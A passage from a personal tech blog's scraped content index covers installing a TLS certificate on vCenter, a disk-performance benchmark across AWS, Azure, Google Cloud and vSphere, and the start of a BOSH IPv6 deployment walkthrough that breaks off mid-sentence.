Certificate\u0026rdquo;. We followed these instructions when generating our Certificate Signing Request (CSR) with cfssl. This gist contains our chained certificate, our root certificate, and our redacted key (our key with several lines removed). This VMware thread describes a procedure to remove old trusted root certificates from PSC. Footnotes [not-what-you-think]\nWe\u0026rsquo;re not publishing our private key, but not for the reasons you think. You probably think it\u0026rsquo;s about security, about preventing man-in-the-middle (MITM) attacks. It\u0026rsquo;s not. Our server is behind a firewall and can only be accessed from our internal network. If you were in a position to execute an MITM attack, it would mean that our network was grossly compromised, and the jig would be up (an MITM attack would be the least of our concerns).\nNo, security is not the reason. Revocation is the reason. The last time that we published a private key, our certificate was revoked in a rather spectacular manner, and the CA refused to issue us another one unless we promised not to publish it. We agreed, and we hew to our agreement, for we are men of our word.\n[hand-wavy]\nThis is the most hand-wavy part of the blog post, obtaining the root certificate. On one hand, root certificates are everywhere — every one of the billions of browsers has a copy of the approximately 160 root certificates.\nOn the other hand, you may have to do some digging. Whichever CA you choose should publish their root certificate. Sectigo, for example, publishes their root certificate here.\nIf that\u0026rsquo;s a dead-end, you may want to check Mozilla\u0026rsquo;s list of root certificates.\nWe had an interesting experience where one version of the Sectigo root certificate whose canonical name (CN) was \u0026ldquo;USERTrust RSA Certification Authority\u0026rdquo;, worked, but the intermediate certificate included in the chain, whose canonical name was also \u0026ldquo;USERTrust RSA Certification Authority\u0026rdquo;, and which we mistakenly took for a root certificate, did not work.\nTo determine if the certificate you have is a root certificate, confirm the subject is the same as the issuer. In the following example, we use two common TLS command line tools (cfssl and openssl) to examine the Sectigo root certificate addtrustexternalcaroot.crt and ensure the issuer is the same as the subject:\nFirst we use cfssl, whose output is JSON, which we pipe to jq to extract the Common Name of the issuer and subject:\ncfssl certinfo -cert addtrustexternalcaroot.crt | jq -r \u0026#39;[ .issuer.common_name, .subject.common_name ]\u0026#39; produces:\n[ \u0026#34;AddTrust External CA Root\u0026#34;, \u0026#34;AddTrust External CA Root\u0026#34; ] With openssl we can use a simple egrep to extract the information we need.\nopenssl x509 -in addtrustexternalcaroot.crt -noout -text | egrep \u0026#34;Issuer:|Subject:\u0026#34; produces:\nIssuer: C=SE, O=AddTrust AB, OU=AddTrust External TTP Network, CN=AddTrust External CA Root Subject: C=SE, O=AddTrust AB, OU=AddTrust External TTP Network, CN=AddTrust External CA Root Now, when faced with the above output, a reasonable might ask, \u0026ldquo;why on earth is Comodo using Addtrust\u0026rsquo;s root certificate? Why don\u0026rsquo;t they use their own certificate?\u0026rdquo; One can only speculate.\nCorrections \u0026amp; Updates 2020-12-26\nRe-wrote instructions to have vCenter generate the CSR. It appears to work better, specifically with regard to the update manager (though I can\u0026rsquo;t find the links to bolster that assertion).\n2020-05-22\nUpdated to include newly-issued TLS certificates to replace the ones that had been revoked, but this time we did not publish the private key (the cause of the revocation).\nWe deprecate Comodo in favor of Sectigo, the new name.\n2020-04-08\nWe include a Quickstart section for vCenter 7.\n","permalink":"https://blog.nono.io/post/vcenter_6.7_tls/","summary":"The following section is the new Quickstart for installing a TLS certificate on vCenter 7\nvCenter 7 Quickstart On your vCenter, navigate to Menu → Administration → Certificates → Certificate Management\nOn the __MACHINE_CERT tile, click Actions, select Generate Certificate Signing Request (CSR).\nEnter the appropriate info; for inspiration, this is what we entered:\nCommon name: vcenter-70.nono.io Organization: nono.io Organizational Unit: homelab Country: United States State/Province: California Locality: San Francisco Email Address: yoyo@nono.","title":"How to Install a TLS Certificate on vCenter Server Appliance (VCSA) 6.7 [Updated for vCenter 7]"},{"content":"0. Overview [Disclaimer: the author works for Pivotal Software, of which Dell is an investor. Dell is also an owner of VMware]\nIt\u0026rsquo;s helpful to know the performance characteristics of disks when selecting a disk type. For example, the performance of a database server will be greatly affected by the IOPS of the underlying storage. Similarly, a video-streaming server will be affected by the underlying read throughput.\n0.0 Highlights: If you need a fast disk, nothing beats a local vSphere NVMe drive. Nothing. Whether its IOPS, read throughput, or write throughput, NVMe is the winner hands down. Google\u0026rsquo;s SSD (Solid State Drive) storage has 22× the IOPS of its standard storage. For general purpose use, always go with the SSD; however, if you\u0026rsquo;re doing streaming (long reads or writes), the standard storage may be the better (and cheaper) choice. AWS\u0026rsquo;s io1 disk is a waste of money unless you need an IOPS \u0026gt; 4k (the gp2 disk has an IOPS of ~4k). AWS\u0026rsquo;s now-deprecated standard storage has a decent IOPS of ~2k. The key to getting IOPS out of Azure is to enable Host Disk Caching, which can catapult an anemic 120 IOPS to a competitive 8k IOPS. 0.1 Metrics, IaaSes, and Results In this blog post we record three metrics:\nIOPS Write throughput Read throughput And we record them for the following IaaSes:\nAWS Microsft Azure Google Compute Engine VMware vSphere The table below summarizes our findings:\nIaaS Disk Type IOPS Read MB/s Write MB/s AWS standard 1913 87 99 gp2 3634 92 103 io1 (1000 IOPS) 1210 94 102 Azure Standard 20 GiB 121 15 28 Premium 256 GiB 1106 90 106 Google pd-standard 20 GiB 162 43 74 pd-standard 256 GiB 239 65 78 pd-ssd 20 GiB 6150 27 29 pd-ssd 256 GiB 11728 138 149 vSphere FreeNAS 7776 104 91 SATA SSD 26075 470 462 NVMe SSD 28484 1614 1577 These benchmarks are not gospel. Even though they are recorded precisely, they are not precise. For example, we report the GCE pd-standard Read MB/s as 43, which was the average over the course of ten runs, but the metric is more nuanced — the first four runs averaged 98 MB/s, and then, once Google throttled the performance, dropped precipitously to 6 MB/s. Your mileage may vary.\n1. IOPS Performance We feel that, in general, IOPS is the most important metric when judging storage speed: The advent of solid-state drives (SSDs) with their high IOPS (\u0026gt;10k) exceeding by traditional hard disk drives by an order of magnitude or more, was a game-changer.\n[Authors\u0026rsquo; note: in this blog post we use the term \u0026ldquo;standard\u0026rdquo; to refer to storage back by magnetic media (i.e. \u0026ldquo;rapidly rotating disks (platters) coated with magnetic material\u0026rdquo;. This is also the term that the IaaSes use. For example, Google refers to its magnetic storage as \u0026ldquo;standard hard disk drives (HDD)\u0026rdquo;.]\nBelow is a chart of the results of the IOPS benchmark. Note that the 256 GiB Google SSD drive appears to be the winner, but only because we have excluded the results of the vSphere local SSD disks (SATA \u0026amp; NVMe) from these charts (don\u0026rsquo;t worry, we\u0026rsquo;ll include them in a chart further down). Also note that Google scales the performance of the disk with the size of the disk: all else being equal, the bigger disk will have better performance, and we see that reflected in the scoring: the 256 GiB Google SSD disk leads the pack, but the 20 GiB disk lands squarely in the middle.\nWhile we\u0026rsquo;re on the topic of Google, its standard drive takes two of three worst slots of IOPS performance. The 256 GiB standard drive has an IOPS of 239, the 20 GiB, 162. Note that these numbers aren\u0026rsquo;t bad for magnetic disk storage (a typical magnetic hard drive will have 75-150 IOPS), it\u0026rsquo;s just that they seem lackluster when compared to the other IaaSes\u0026rsquo; storage offerings.\nAWS\u0026rsquo;s io1 storage is a \u0026ldquo;tunable\u0026rdquo; storage offering — you specify the number of IOPS you require. In our benchmarks we specified 1,000 IOPS, and we were pleased that AWS exceeded that by 20%. Interestingly, the io1 numbers were precisely clustered: across all ten runs the IOPS were within ±2 of each other (standard deviation of 1.8).\n2. Read Performance Read performance is important for applications which stream large amounts of data (e.g. video servers). It\u0026rsquo;s also useful for applications which fling disk images around (e.g. BOSH Directors).\nOnce again we see Google\u0026rsquo;s 256 GiB SSD leading the pack, and vSphere\u0026rsquo;s iSCSI FreeNAS server not far behind (never underestimate the throughput of seven magnetic drives reading in parallel).\nInterestingly the read performance of AWS is fairly consistent across all three of its offerings (standard, gp2, io1), which leads to the conclusion that if you\u0026rsquo;re on AWS, and you use the storage for streaming reads, then AWS standard is the cost-effective answer (be careful: we did not benchmark AWS\u0026rsquo;s \u0026ldquo;Throughput Optimized HDD\u0026rdquo; storage type, st1, which may be a better solution).\nAlthough Google\u0026rsquo;s SSD storage turns in great performance numbers, their standard storage doesn\u0026rsquo;t, landing second-to-last in terms of read throughput.\n3. Write Performance Write performance is important for applications which write large files: e.g. disk images, BOSH stemcells, large videos, etc.\nOnce again, the Google SSD 256 GiB is the leader, and by a decent margin, too.\nSecond place is the Azure Premium 256 GiB, which is a surprise because until this point Azure has had a difficult time cracking the top half of these charts.\nThe next three are the AWS storage types, which have been clustered together for the two previous benchmarks as well, leading one to conclude that AWS storage types are more similar than they are different.\nGoogle, besides taking the lead, also corners three of the bottom four slots: Google storage can be fast, but can also be slow. Also, the Google standard offering again is surpringly faster than the 20 GiB SSD, so, for small disks on Google where throughput is important, choose standard storage over SSD.\nBelow is a chart of the results of the write benchmark. The topmost item is the fastest:\n4. IaaS-specific Commentary 4.0 AWS AWS storage options are noted more for their similarity than for their differences.\nA note about the chart below: The storage type (e.g. \u0026ldquo;io1 20 GiB\u0026rdquo;) is denoted on the horizontal axis at the bottom. IOPS, represented in blue, are recorded on the axis on the left (e.g. \u0026ldquo;io1 20 GiB\u0026rdquo; has an IOPS of 1210). Throughput, both read and write, are recorded on the axis on the right (e.g. \u0026ldquo;io1 20 GiB\u0026rdquo; has a read throughput of 94 MB/s).\nAmazon differs from Azure and Google in that it doesn\u0026rsquo;t scale performance to the size of the drive. Looking at the chart above, it would be difficult to distinguish the 20 GiB standard drive from the 256 GiB standard drive from the performance numbers alone. Indeed, one might be surprised to discover that the bigger drive has slightly worse performance than the smaller one (which we discount as being statistically insignificant).\nIOPS seems to be the real differentiator, not throughput (the throughput numbers are very similar across storage types, though gp2\u0026rsquo;s throughput is marginally faster than standard\u0026rsquo;s).\nAWS gp2 is a good overall choice; io1 storage is poor value unless one needs more than 4k IOPS and throughput greater than what gp2 storage offers. Per AWS\u0026rsquo;s website, \u0026quot;[io1 should be used for] Critical business applications that require sustained IOPS performance, or more than 10,000 IOPS or 160 MiB/s of throughput per volume\u0026quot;\nAnd io1 is certainly expensive; of our AWS charges for the month during which these benchmarks were run, the io1 storage accounted for over half the cost (which included the cost of the EC2 instances, network bandwidth, etc.). And when one considers that the io1 was configured with a very modest 1k IOPS, it becomes apparent how expensive io1 is (we suspect that io1 storage with 10k IOPS may radically eclipse other AWS costs for many customers).\nThe difference between Amazon\u0026rsquo;s \u0026ldquo;Previous Generation\u0026rdquo; standard storage and its gp2 storage is mostly IOPS, for half the price ($0.05/GB-month vs. $0.10/GB-month at the time of this writing) standard offers half the IOPS (1913 vs. 3634), with almost identical throughput numbers. Save your money if you need the storage but not the IOPS.\nAWS\u0026rsquo;s write throughput consistently outperforms its read throughput, which may indicate their storage backend uses write-caching.\nNever one to be intimidated by complexity, AWS has a baroque credit system for its gp2\u0026rsquo;s performance which tilts the field in favor of VMs that are spun up briefly to run benchmarks such as GoBonnieGo — a long-running VM with heavy disk usage may not see the performance reflected in our results. We ran a special benchmark to determine if we could exhaust our credits, and the answer was yes, we could, but it took three hours. See below for details.\n4.1 Azure If you want IOPS on your Azure VMs, we strongly encourage you to set your Premium Storage disk caching to ReadOnly at a minimum, ReadWrite if your application can stomach the loss of writes (but don\u0026rsquo;t do this for databases).\nTo get the most out of your Azure storage, we recommend the following:\nenable Disk Caching unless your disk is big and your activity is mostly streaming (not IOPS) use Standard Storage if your disk use is light, Premium if heavy The biggest single factor for boosting IOPS for Azure disks is Disk Caching But don\u0026rsquo;t take our word for it — look at our results below:\nHow to read the chart: The horizontal axis denotes the storage type. The first two letters of the storage type are either \u0026ldquo;st\u0026rdquo; or \u0026ldquo;pr\u0026rdquo;, denoting Azure Standard storage and Azure Premium storage, respectively. The second part is a number, either 20 or 256 representing the size of the disk in GiB. Finally, the optional suffix \u0026ldquo;rw\u0026rdquo; means that ReadWrite caching was enabled on that disk. To tie it all together with an example, \u0026ldquo;pr 256 rw\u0026rdquo; means that the benchmark was performed on a 256 GiB drive of Azure Premium storage with caching set to ReadWrite.\nIOPS, represented in blue, are recorded on the axis on the left (e.g. \u0026ldquo;st 20 rw\u0026rdquo; has an IOPS of 8219). Throughput, both read and write, are recorded on the axis on the right (e.g. \u0026ldquo;pr 256\u0026rdquo; has a read throughput of 90 MB/s).\nWe could find no significant difference in performance between Azure Standard Managed Disks and Azure Premium Managed Disks — the results for \u0026ldquo;st 20\u0026rdquo; match the results for \u0026ldquo;pr 20\u0026rdquo;, the results for \u0026ldquo;st 256\u0026rdquo; match the results for \u0026ldquo;pr 256\u0026rdquo;. We assumed an error in our configurations, but in spite of checking several times we could find no mistake. This flies in the face of the Microsoft Documentation, which indicates that the backend for the Standard Storage is different than Premium\u0026rsquo;s, and slower, too:\nPremium Managed Disks are high performance Solid State Drive (SSD) based\nStandard Managed Disks use Hard Disk Drive (HDD) based Storage\nOn Azure, the bigger disk will outperform the smaller disk; however this changes once you enable caching: disks of different size will perform identically when caching is enabled. As you can see in the chart above, the performance of the Standard 20 GiB disk (\u0026ldquo;st 20 rw\u0026rdquo;) is almost identical to the Premium 256 GiB disk (\u0026ldquo;pr 256 rw\u0026rdquo;) — if you placed your hand over the legend, you\u0026rsquo;d be hard-pressed to distinguish the two disks based on their performance.\n4.1.0 Azure Pricing Azure\u0026rsquo;s pricing for Standard storage is approximately $0.048 per GiB/month for 32 GiB, which is a hair under AWS\u0026rsquo;s pricing for its deprecated standard disk ($0.05 per GiB month) but slightly over AWS\u0026rsquo;s st1 Throughput Optimized offering ($0.045 per GiB/month). Azure\u0026rsquo;s Premium storage comes in at $0.165 for 32 GiB, which is a hair under Google\u0026rsquo;s pricing for its SSD offering ($0.17 per GiB month).\nBut Azure has a rider in small print at the bottom of the page which could make Standard disks much more expensive than Premium:\nWe charge $0.0005 per 10,000 transactions for Standard Managed Disks\nAs a worst-case scenario, we could spend close to $65 in a month if we push our 256 GiB Standard disk to its limit (500 IOPS):\n( $0.0005 / 10000 IO operations ) × ( 500 IO operations / 1 second ) × ( 3600 seconds / 1 hour ) × ( 24 hours / 1 day ) × ( 30 days / 1 month ) = $64.80\n4.1.1 Azure IOPS Azure deserves recognition for delivering within 0.5% the amount of the expected IOPS. On the Premium 256 GiB drive, Azure said to expect 1100 IOPS, and our benchmark came in at 1106:\n4.2 Google Cloud Platform Google takes the crown for both the best and the worst. There\u0026rsquo;s a 22× increase in their performance between their Standard offering and their SSD offering (for comparison, AWS\u0026rsquo;s is 2× and Azure\u0026rsquo;s is 1×), and Google also scales performance by disk size, which means that the 256 GiB SSD leads the pack, and the 20 GiB Standard — well, let\u0026rsquo;s just say it tries its best.\nAnd it\u0026rsquo;s not the disks\u0026rsquo; fault — it appears that Google throttles the performance of its small-size Standard drive: After four runs of our benchmark, the performance plummeted. IOPS dropped ~75% (from ~300 to ~80), read throughput ~95% (98 MB/s to 6 MB/s), and write throughput ~90% (135 MB/s to 13 MB/s). Perhaps a visualization would help to grasp this steep decline:\nThe thing to understand is that the performance numbers for Google\u0026rsquo;s standard drive are worse than they appear — the storage is able to put up a good front for the first twenty minutes (each benchmark takes approximately 4-5 minutes to run on the Google Standard), and then the performance collapses.\n4.2.0 Google\u0026rsquo;s vs. AWS\u0026rsquo;s Throttling Google isn\u0026rsquo;t unique among the IaaSes for this performance cliff — AWS experiences the same drop-off for its gp2 20 GiB drive. We can see in the illustration below that the drop-off is similar to Google\u0026rsquo;s; however, the drop-off occurs much later in AWS — rather than occurring on the fifth run as had happened in Google\u0026rsquo;s case, Amazon\u0026rsquo;s performance collapsed on the thirty-fourth run. Google collapsed after 20 minutes; Amazon collapsed after 3 hours.\n4.3 vSphere Our vSphere benchmarks were carried out under near-optimal [Optimal] conditions; there were no noisy neighbors.\nBefore we discuss the performance of vSphere local disks, we\u0026rsquo;d like to point out that the vSphere non-local storage (the FreeNAS-based iSCSI storage) carried itself quite admirably in the benchmarks, placing 2nd in IOPS, 2nd in read throughput (and the middle of the pack in write throughput — nothing is perfect). This is doubly impressive when one takes into account that the vSphere storage setup that we benchmarked is not a professional setup — the networking backend is 1 Gbps, not 10 Gbps, the disks are magnetic, not SSDs (though with an SSD cache). It would not be unreasonable to assume that a professional grade storage backend, e.g. a Dell EMC VNX5600 would turn in better results, possibly toppling the reigning champion, Google.\n4.3.0 The Unbelievable Performance of [vSphere] Local Disks Now let\u0026rsquo;s discuss the vSphere local disks. In the chart below, we compare the results of our vSphere local disk benchmarks with our reigning champion, Google 256 GiB SSD:\nWe can see that in every measure, the performance of local disks dwarf the performance of Google\u0026rsquo;s flagship offering.\nBut local disks are not a perfect solution, for they offer speed at the expense of reliability (a true Faustian bargain) — one disk crash and the data\u0026rsquo;s all gone.\nAlso, local SSD disks are available on AWS, Azure, and Google, and, although we have not benchmarked their performance, it\u0026rsquo;s something we\u0026rsquo;d be very interested in (we haven\u0026rsquo;t benchmarked those because the ability to use local disks would require a significant change to BOSH, the cloud orchestrator we use to deploy the VMs on which we run our benchmarks).\n5. Testing Methodology We used BOSH to deploy VMs to each of the various IaaSes.\nWe used the following instance types for each of the IaaSes:\nIaaS Instance Type Cores RAM (GiB) Disk Type AWS c4.xlarge 4 7.5 standard gp2 io1 Azure F4s v2 4 8 Standard 20 GiB Premium 256 GiB Google n1-highcpu-8 8 7.2 pd-standard pd-ssd vSphere N/A 8 8 FreeNAS SATA SSD NVMe SSD For those interested in replicating our tests or reproducing our results, our BOSH manifests and Cloud Configs can be found here.\nWe spun up a VM, and ran the benchmark ten times in succession, storing the results in JSON format (i.e. we passed the arguments -runs 10 -json to GoBonnieGo). The numbers displayed in the charts and tables are the averages of the ten runs.\nEach VM was configured with a BOSH persistent disk of a certain type (e.g. Google SSD 256 GiB). We instructed GoBonnieGo to exercise the persistent disk (not the root nor the ephemeral disks) (i.e. we passed the argument -dir /var/vcap/store/gobonniego to GoBonnieGo).\nEach GoBonnieGo run consists of the following steps:\nA write test, which creates a set of files consisting of random data whose aggregate size equals twice the physical RAM of the VM (e.g. for the AWS test, which used a c4.xlarge instance type with 7.5 GiB, GoBonnieGo created a set of files whose footprint was 15 GiB). The throughput (write MB/s) is calculated by taking the total amount written (e.g. 15 GiB) and dividing by the time it takes to write that amount. The test writes 64 kiB blocks of random data. At that point, GoBonnieGo clears the buffer cache to avoid skewing the upcoming read benchmark. A read test, which reads the files created by the write test. Again, the throughput (read MB/s) is calculated by taking the total amount read (e.g. 15 GiB) and dividing by the time it takes to read that amount. The read blocksize is 64 kiB. GoBonnieGo clears the buffer cache again, to avoid skewing the upcoming IOPS benchmark. Finally, GoBonnieGo runs an IOPS test, where it randomly seeks to locations in the test files, and then either reads or writes a 512-byte block (with a 9:1 ratio of reads to writes). It runs the test for approximately 5 seconds, and at the end tallies up the total number of reads \u0026amp; writes and divides by the duration. GoBonnieGo then deletes its test files and records its results. 5.0 Cores, Preferably 8 Our overarching goal was to have 8 cores for the vSphere NVMe SSD benchmark. The reason we wanted so many cores was that the processor, an Intel Xeon Processor D-1537, which is clocked at a measly 1.7 GHz, became the choke point.\nThat\u0026rsquo;s right: The Samsung NVMe was so fast that it shifted the choke point from storage to CPU — we were no longer benchmarking the SSD; we were benchmarking the CPU!\nThis problem was caused by three factors: slow clock speed, fast disk, and a single-threaded filesystem benchmark program (bonnie++).\nCuriously, we weren\u0026rsquo;t the first to discover that bonnie++, in certain configurations, may artificially cap the performance of the filesystem: in his most-excellent blog post Active Benchmarking: Bonnie++, Brendan Gregg concludes, in his summary:\nThis test [bonnie++] is limited by: CPU speed \u0026hellip; and by the fact that it is single-threaded.\nOur first clue that something was amiss was that the our initial benchmark gave baffling results — the Crucial SATA, which should have been slower than the Samsung NVMe, was instead faster.\nMetric Samsung NVMe[Samsung] Crucial SATA[Crucial] IOPS 981 14570 Write MB/s 180 405 Read MB/s 395 526 [Note: Although the read and write throughput numbers could be ascribed to difference in the CPU frequency, the IOPS number are off by more than an order of magnitude, so we suspect some other factor may be at work.]\nWe were at a crossroads: our benchmarking tool, bonnie++, wasn\u0026rsquo;t able to properly benchmark our NVMe storage, but we didn\u0026rsquo;t want to omit those results from our blog post, so we decided to do what any self-respecting developer would do: write our own filesystem benchmark tool!\nWe wrote GoBonnieGo, A Golang-based filesystem benchmark tool which uses concurrency to run on as many CPU cores as available. Through experimentation, we found that four cores wasn\u0026rsquo;t enough to benchmark the Samsung NVMe (all four CPUs were at 100% utilization), but that six cores was. Six, however, is not a power of two, so we rounded up to 8 cores.\n5.1 RAM: 4 - 8 GiB We wanted 4-to-8 GiB RAM, dependent on what the IaaS allowed us. The amount of data written for each benchmark was twice the size of physical RAM, so VMs with twice the RAM should have no added advantage (buffer cache notwithstanding).\n5.2 Disk: 20 GiB We chose to run our test on the BOSH persistent disk, for it was more flexible to size than the root disk. We chose a disk size of 20 GiB, with the exception of Azure, where we ran a second benchmark with a disk of 256 GiB.\n6. Methodology Shortcomings We wrote our own benchmark program; it may be grossly flawed.\nEach benchmark (e.g. AWS gp2) was taken on one VM. That VM may have been on sub-optimal hardware or suffered from the \u0026ldquo;noisy neighbor\u0026rdquo; effect.\nEach benchmark was only taken in one datacenter (region); there may be differences in performance between datacenters. A more comprehensive benchmark would collect data from many regions:\nAWS benchmark was taken in N. Virginia, us-east-1 GCE benchmark was taken in Council Bluffs, Iowa, us-central1 Azure benchmark was taken in Singapore vSphere is not a public cloud, so the location is irrelevant, but the benchmark was taken in San Francisco The time that a benchmark was taken may make a difference. A benchmark taken at 3:30am on a Sunday may have better results than a benchmark taken at 10:30am on a Monday. A more comprehensive benchmark would consist of many tests taken at different times. Our benchmarks were done on Sunday night, but it may have adversely affected the Azure test, which was in Singapore, and was Monday morning there.\nWe only selected one instance type for each IaaS (e.g. AWS\u0026rsquo;s c4.xlarge). Running our benchmark across many instance types may show interesting results.\nWe didn\u0026rsquo;t cover all the volume types; for example, we did not benchmark AWS\u0026rsquo;s st1 (Throughput Optimized HDD) or sc1 (Cold HDD) volume types. We only tested AWS\u0026rsquo;s gp2 and io1.\nReferences GoBonnieGo filesystem benchmark tool Benchmark configuration: BOSH Cloud Configs and manifests: https://github.com/cunnie/deployments/tree/master/gobonniego Benchmark results (raw JSON files): https://github.com/cunnie/freenas_benchmarks/tree/master/gobonniego-1.0.7 Google Sheet containing summarized benchmark results and graphs: https://docs.google.com/spreadsheets/d/1elngT-eHr5_RVyoPj1UKkr-7eveCw_JNXPlVFo6ECvs Footnotes [Optimal] The vSphere benchmark runs suffered almost no disk contention from 40+ VMs running on the same hardware, making the vSphere results optimal.\nBelow are screenshots of the disk usage on the two physical machines (ESXi hosts) on which ran the VMs which ran the benchmarks (the benchmarks were not running when these screenshots were taken). Note that the peak disk usage was 3.6 kBps. To put that into perspective, the slower (SATA, not NVMe) vSphere disk throughput for write was 462 MBps: based on these charts, the disk usage from the other, non-benchmark VMs degraded the results of the benchmark by, at most, 0.008%. In other words, rather than suffering from \u0026ldquo;noisy neighbors\u0026rdquo;, the vSphere neighbors were quiet. Dead-quiet. The benchmark VMs had the underlying storage hardware almost completely to themselves.\nAbove is the chart of the disk usage on the two vSphere ESXi hosts before benchmarking [FreeNAS] Our iSCSI-based FreeNAS setup has been described in two blog posts (here and here), so we will not go into details other than to mention the network interface is 1 Gbps link, not a 10 Gbps link, which caps the throughput to ~100 MB/s. In other words, with a higher-speed Network Interface Controller (NIC) we could expect faster throughput. Indeed, we ran our benchmark locally on the FreeNAS server, and our throughput was ~200 MB/s, which is fast, but will never approach the throughput of the NVMe (~1500 MB/s) or even the SATA (450 MB/s); however, what the FreeNAS offers that the NVMe and the SATA don\u0026rsquo;t is redundancy: a disk failure on the FreeNAS is not a calamitous event.\n[Samsung] The Samsung SSD 960 2TB M.2 2280 PRO is installed in a Supermicro X10SDV-8C-TLN4F+ motherboard with a soldered-on 1.7 GHz 8-core Intel Xeon Processor D-1537, and 128 GiB RAM.\nThe results of the CPU-constrained bonnie++ v1.97 benchmarks of the Samsung 960 PRO are viewable here.\nAbove is a photo of the Samsung NVMe mounted in the Supermicro motherboard: [Crucial] The Crucial MX300 1TB M.2 Type 2280 SSD is installed in an Intel Skull Canyon which features a 2.6 GHz 4-core Intel Core i7-6770HQ and 32 GiB RAM.\nThe results of the bonnie++ v1.97 benchmarks of the Crucial MX 300 are viewable here.\nThe photograph below shows the Crucial SSD, but astute observers will note that it\u0026rsquo;s not the Skull Canyon motherboard (it isn\u0026rsquo;t) — it\u0026rsquo;s the Supermicro motherboard.\nCorrections \u0026amp; Updates 2018-09-18\nThe worst-case scenario for the cost of a 256 GiB Standard disk on Azure was ~22× too high: it is $64.80, not $1,425.60. Thanks Mike Taber!\n2018-03-19\nClarified Dell\u0026rsquo;s relationship to Pivotal Software: Dell is an investor in Pivotal; Dell is not the owner of Pivotal.\n2018-04-01\nIaaS Disk Performance: Use more-accurate GoBonnieGo 1.0.7\nUsed the more-accurate numbers generated by a second run using the newer GoBonnieGo 1.0.7 which clears the buffer cache before the IOPS and read tests. The IOPS number is both lower and more accurate. Updated tables and charts.\nRemoved the vSphere local disk benchmarks from the charts; the numbers were too good and dwarfed the results of the other IaaSes and made them hard to read.\nCreated a highlights section which has important take-aways for each IaaS. Removed the Take-aways section; it was no longer needed.\nExpanded the metrics (IOPS, read, and write) commentary.\nAdded a section specific to each IaaS.\nOn Azure, called out the importance of enabling host disk caching. If not enabled, Azure\u0026rsquo;s IOPS are abysmal.\nAdded new test results for Azure disks with host disk caching enabled.\nIncluded a more in-depth description of the benchmarks (10 runs, IOPS, read, write, clearing of the buffer cache).\nAdded a measurement of AWS\u0026rsquo;s and Google\u0026rsquo;s performance-throttling.\nShrunk the presented size of several images — they took up almost the entire page!\nFixed the Azure VM type (included the \u0026ldquo;s\u0026rdquo;).\n2018-04-02\nSwitched the order of the columns of the chart at the top (IOPS, write, read → IOPS, read, write) to match the remainder of the post.\nRemoved the Azure footnote — nothing was referring to it, and it had no information that wasn\u0026rsquo;t already mentioned elsewhere in the post.\n2018-04-04\nModified the URL of the images to point to their location on GitHub, not Google Photos. Google Photos has the unfortunate habit of expiring URLs after a few days, and we are disappointed with them.\nAdded anecdotal evidence of the expense of AWS\u0026rsquo;s io1 storage type (it\u0026rsquo;s quite expensive).\n","permalink":"https://blog.nono.io/post/gobonniego_results/","summary":"0. Overview [Disclaimer: the author works for Pivotal Software, of which Dell is an investor. Dell is also an owner of VMware]\nIt\u0026rsquo;s helpful to know the performance characteristics of disks when selecting a disk type. For example, the performance of a database server will be greatly affected by the IOPS of the underlying storage. Similarly, a video-streaming server will be affected by the underlying read throughput.\n0.0 Highlights: If you need a fast disk, nothing beats a local vSphere NVMe drive.","title":"Benchmarking the Disk Speed of IaaSes"},{"content":"0. Abstract BOSH is a VM orchestrator; a BOSH Director creates, configures, monitors, and deletes VMs. The BOSH Director interoperates with a number of IaaSes (Infrastructure as a Service), one of which is VMware vSphere, a virtualization platform. BOSH traditionally operates exclusively within the IPv4 networking space (i.e. the BOSH Director has an IPv4 address (e.g. 10.0.0.6), and the VMs which it deploys also have IPv4 addresses); however, recent changes have enabled IPv6 networking within the BOSH Framework.\nIn this blog post we show how we deployed a BOSH Director with an IPv4 address (no IPv6), and, in turn, used the BOSH Director to deploy a VM with both IPv4 and IPv6 addresses and which runs an nginx web server. Future blog posts will describe installing a BOSH Director in a pure IPv6 network.\nWe expect this blog post to be of interest to those who plan to deploy BOSH in IPv6-enabled environments on vSphere.\nBOSH with IPv6 is in beta! We urge caution when deploying BOSH with IPv6 – limiting your deployments to test environments is a good idea. We welcome feedback.\n1. Prerequisites Use at least the following versions:\nStemcell 3468.13 Ubuntu/Trusty [Ubuntu] BOSH Director 264.5.0 BOSH CLI 2.0.45 bosh-deployment commit be379d8 2. Deployment Overview In this example, we deploy a multihomed VM [why not dual-stack?] running an nginx web server.\n3. Deploying the BOSH Director We use bosh-deployment to deploy our BOSH director. You can use your existing Director. If you need to deploy one, follow the instructions on bosh.io.\nWe set our BOSH Director\u0026rsquo;s alias to \u0026ldquo;ipv4\u0026rdquo; and log in:\n# set the alias for our BOSH Director to \u0026#34;ipv4\u0026#34; bosh -e 10.0.9.151 alias-env ipv4 # use something along these lines to find the admin password: # `bosh int --path /admin_password creds.yml` # log in bosh -e ipv4 log-in Email (): admin Password (): 4. Upload the Cloud Config Assuming that you already have a Cloud Config with an IPv4 network, let\u0026rsquo;s add an additional Cloud Config that defines the IPv6 network.\nbosh -e ipv4 update-config cloud cloud-config-vsphere-ipv6.yml --name ipv6 The IPv6 Cloud Config is shown below, and can also be seen on GitHub.\nnetworks: - name: ipv6 type: manual subnets: - range: \u0026#34;2601:0646:0100:69f1:0000:0000:0000:0000/64\u0026#34; gateway: \u0026#34;2601:0646:0100:69f1:020d:b9ff:fe48:9249\u0026#34; dns: - 2001:4860:4860:0000:0000:0000:0000:8888 - 2001:4860:4860:0000:0000:0000:0000:8844 azs: [z1] cloud_properties: name: IPv6 Don\u0026rsquo;t abbreviate IPv6 addresses in BOSH manifests or Cloud Configs [why no abbreviations?] . Don\u0026rsquo;t use double colons (::), don\u0026rsquo;t strip leading zeroes. As an extreme example, the loopback address (::1) should be represented as 0000:0000:0000:0000:0000:0000:0000:0001.\n4. Upload the Stemcell and the nginx Release bosh -e ipv4 us https://bosh.io/d/stemcells/bosh-vsphere-esxi-ubuntu-trusty-go_agent?v=3468.17 \\ --sha1 1691f18b9141ac59aec893a1e8437a7d68a88038 bosh -e ipv4 ur https://bosh.io/d/github.com/cloudfoundry-community/nginx-release?v=1.12.2 \\ --sha1 70a21f53d1f89d25847280d5c4fad25293cb0af9 5. Deploy the Web server We create a manifest for our deployment; it can be viewed on Github.\nWe assign our instance group to have two networks within our manifest as follows:\ninstance_groups: - name: nginx networks: - name: default - name: ipv6 default: [dns, gateway] Note that we assign our default gateway to the IPv6 interface. This has the implication that our IPv4 interface can only communicate on its local subnet (i.e. 10.0.9.0/24), which means that it must be deployed on the same subnet as the BOSH Director (otherwise the VM would be unable to communicate with the Director, hence would be unable to receive its configuration). [Routing]\nDeployment is straightforward:\nbosh -e ipv4 -d nginx deploy nginx-ipv46.yml 6. Check It\u0026rsquo;s Working We check to make sure our nginx VM is running and that it has configured its IP 